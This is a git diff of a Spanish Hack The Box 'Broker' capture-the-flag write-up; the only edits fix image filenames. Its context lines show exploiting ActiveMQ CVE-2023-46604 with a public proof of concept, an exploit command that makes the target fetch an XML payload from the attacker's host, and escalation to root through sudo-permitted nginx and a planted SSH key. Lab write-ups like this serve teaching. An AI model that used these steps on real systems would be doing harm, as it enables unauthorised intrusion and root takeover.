@@ -3,7 +3,7 @@ title: "Broker - WriteUp"
 date: Sun Jun 09 2024 15:15:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Linux]
 tags: [ctf, nmap, htb, cve, exploit, nginx, apache, cve-2023-46604, linux, ssh]
-image: /assets/img/htb-writeups/Pasted image 20231129085444.png
+image: /assets/img/htb-writeups/Pasted-image-20231129085444.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20231129085444.png
   platform="HTB"
 %}
 
-![Broker](/assets/img/htb-writeups/Pasted image 20231129085444.png)
+![Broker](/assets/img/htb-writeups/Pasted-image-20231129085444.png)
 
 -----
 
@@ -155,7 +155,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 HTTP 80
 
-![BROKER](/assets/img/htb-writeups/Pasted image 20231129085444.png)
+![BROKER](/assets/img/htb-writeups/Pasted-image-20231129085444.png)
 
 Servicio ActiveMQ vulnerable a CVE-2023-46604
 Buscamos información y encontramos un PoC. https://github.com/evkl1d/CVE-2023-46604
@@ -196,14 +196,14 @@ Y en otra terminal ejecutaremos todo el exploit atacando al puerto 61616 que es 
 $ python3 exploit.py -i 10.129.58.23 -p 61616 -u http://10.10.16.25/poc.xml
 ```
 
-![BROKER](/assets/img/htb-writeups/Pasted image 20231129091412.png)
+![BROKER](/assets/img/htb-writeups/Pasted-image-20231129091412.png)
 
 Estamos dentro...
 Registramos bandera de usuario y seguimos...
 
 Hacemos un "sudo -l" y nos reponde lo siguiente.
 
-![BROKER](/assets/img/htb-writeups/Pasted image 20231129093901.png)
+![BROKER](/assets/img/htb-writeups/Pasted-image-20231129093901.png)
 
 Podemos ejecutar _nginx_ como root.
 
@@ -242,7 +242,7 @@ Verificamos que la máquina víctima está escuchando por el puerto 81 con el nu
 ss -tunl
 ```
 
-![BROKER](/assets/img/htb-writeups/Pasted image 20231129101919.png)
+![BROKER](/assets/img/htb-writeups/Pasted-image-20231129101919.png)
 
 Ahora generamos un par de claves con el comando "_ssh-keygen -t rsa -f root_" o usaremos una clave publica que tengamos generada y la copiaremos en un archivo llamado _root.pub_ dentro de /tmp
 
@@ -260,7 +260,7 @@ $ ssh -i ~/.ssh/id_rsa root@10.129.58.23
 
 Y pa dentro...
 
-![BROKER](/assets/img/htb-writeups/Pasted image 20231129105512.png)
+![BROKER](/assets/img/htb-writeups/Pasted-image-20231129105512.png)
 ---
 
 **Última actualización**: 2024-06-09<br>
